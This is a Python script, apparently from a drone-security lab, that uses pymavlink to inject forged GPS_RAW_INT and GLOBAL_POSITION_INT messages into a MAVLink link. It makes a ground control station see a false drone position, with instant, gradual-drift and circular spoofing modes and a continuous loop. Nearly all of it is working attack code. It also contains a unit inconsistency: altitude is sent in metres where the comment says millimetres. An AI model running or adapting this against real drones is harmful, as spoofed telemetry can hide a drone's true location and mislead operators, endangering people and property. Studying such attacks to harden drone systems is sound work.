#!/usr/bin/env python3
"""
GPS Spoofing Exploit Script
Injects fake GPS coordinates to mislead GCS about drone location
"""

import sys
import time
import math
from pymavlink import mavutil

def inject_gps_spoof(connection, lat, lon, alt, mode='instant'):
    """
    Inject spoofed GPS data
    
    Args:
        connection: MAVLink connection object
        lat: Latitude in degrees
        lon: Longitude in degrees
        alt: Altitude in meters
        mode: Spoofing mode ('instant', 'gradual', 'circular')
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[*] Injecting GPS spoof: lat={lat}, lon={lon}, alt={alt}m (mode: {mode})")
    
    if mode == 'instant':
        # Send GPS data immediately
        send_gps_messages(connection, target_system, target_component, lat, lon, alt)
        print("[+] GPS spoof injected")
    
    elif mode == 'gradual':
        # Gradually shift position from current to target
        print("[*] Gradually shifting GPS position...")
        
        # Try to get current position from vehicle
        try:
            msg = connection.recv_match(type=['GLOBAL_POSITION_INT', 'GPS_RAW_INT'], blocking=True, timeout=2)
            if msg and hasattr(msg, 'lat') and hasattr(msg, 'lon'):
                start_lat = msg.lat / 1e7 if hasattr(msg, 'lat') else 0.0
                start_lon = msg.lon / 1e7 if hasattr(msg, 'lon') else 0.0
                start_alt = getattr(msg, 'alt', 0) / 1000.0 if hasattr(msg, 'alt') else 0.0
            else:
                # Fallback: start from origin if can't get current position
                start_lat, start_lon, start_alt = 0.0, 0.0, 0.0
        except Exception:
            # Fallback: start from origin if can't get current position
            start_lat, start_lon, start_alt = 0.0, 0.0, 0.0
        
        steps = 10
        for i in range(steps + 1):
            factor = i / steps
            # Interpolate from start to target position
            current_lat = start_lat + (lat - start_lat) * factor
            current_lon = start_lon + (lon - start_lon) * factor
            current_alt = start_alt + (alt - start_alt) * factor
            send_gps_messages(connection, target_system, target_component, 
                            current_lat, current_lon, current_alt)
            time.sleep(0.5)
        print("[+] Gradual GPS shift complete")
    
    elif mode == 'circular':
        # Circular movement pattern
        print("[*] Creating circular GPS pattern...")
        radius = 0.001  # ~100 meters
        center_lat = lat
        center_lon = lon
        
        for angle in range(0, 360, 10):
            rad = math.radians(angle)
            offset_lat = radius * math.cos(rad)
            offset_lon = radius * math.sin(rad)
            current_lat = center_lat + offset_lat
            current_lon = center_lon + offset_lon
            
            send_gps_messages(connection, target_system, target_component,
                            current_lat, current_lon, alt)
            time.sleep(0.5)
        print("[+] Circular GPS pattern complete")

def send_gps_messages(connection, target_system, target_component, lat, lon, alt):
    """
    Send GPS_RAW_INT and GLOBAL_POSITION_INT messages
    
    Args:
        connection: MAVLink connection object
        target_system: Target system ID
        target_component: Target component ID
        lat: Latitude in degrees
        lon: Longitude in degrees
        alt: Altitude in meters
    """
    time_usec = int(time.time() * 1e6)
    time_boot_ms = int(time.time() * 1e3) % 4294967295
    
    # Convert to MAVLink format (degrees * 1e7)
    lat_int = int(lat * 1e7)
    lon_int = int(lon * 1e7)
    alt_mm = int(alt * 1000)  # Altitude in millimeters
    
    # Send GPS_RAW_INT
    connection.mav.gps_raw_int_send(
        time_usec,
        3,  # fix_type: 3D fix
        lat_int,
        lon_int,
        alt,  # Altitude in meters * 1000
        100,  # eph: GPS HDOP
        100,  # epv: GPS VDOP
        500,  # vel: GPS ground speed (cm/s)
        0,    # cog: Course over ground (degrees * 100)
        10    # satellites_visible
    )
    
    # Send GLOBAL_POSITION_INT
    connection.mav.global_position_int_send(
        time_boot_ms,
        lat_int,
        lon_int,
        alt_mm,      # Altitude in millimeters
        alt_mm,      # Relative altitude
        0, 0, 0,     # vx, vy, vz (velocity in cm/s)
        0            # hdg: Heading (degrees * 100)
    )

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 gps_spoofing.py <connection> <lat> <lon> <alt> [mode]")
        print("Example: python3 gps_spoofing.py udp:127.0.0.1:14550 37.7749 -122.4194 100")
        print("Example: python3 gps_spoofing.py udp:127.0.0.1:14550 37.7749 -122.4194 100 gradual")
        print("\nModes: instant (default), gradual, circular")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    
    # Validate and parse arguments with proper error handling
    try:
        lat = float(sys.argv[2])
        if not -90 <= lat <= 90:
            raise ValueError("Latitude must be between -90 and 90 degrees")
    except (ValueError, IndexError) as e:
        print(f"[-] Invalid latitude: {e}")
        sys.exit(1)
    
    try:
        lon = float(sys.argv[3])
        if not -180 <= lon <= 180:
            raise ValueError("Longitude must be between -180 and 180 degrees")
    except (ValueError, IndexError) as e:
        print(f"[-] Invalid longitude: {e}")
        sys.exit(1)
    
    try:
        alt = float(sys.argv[4])
        if not -500 <= alt <= 50000:
            raise ValueError("Altitude must be between -500 and 50000 meters")
    except (ValueError, IndexError) as e:
        print(f"[-] Invalid altitude: {e}")
        sys.exit(1)
    
    mode = sys.argv[5] if len(sys.argv) > 5 else 'instant'
    
    if mode not in ['instant', 'gradual', 'circular']:
        print("[-] Mode must be 'instant', 'gradual', or 'circular'")
        sys.exit(1)
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Inject GPS spoof
    if mode == 'instant':
        inject_gps_spoof(connection, lat, lon, alt, mode)
    else:
        # For gradual/circular, run continuously
        print("[*] Running continuous GPS spoofing (Press Ctrl+C to stop)...")
        try:
            while True:
                inject_gps_spoof(connection, lat, lon, alt, mode)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping GPS spoofing...")

if __name__ == "__main__":
    main()
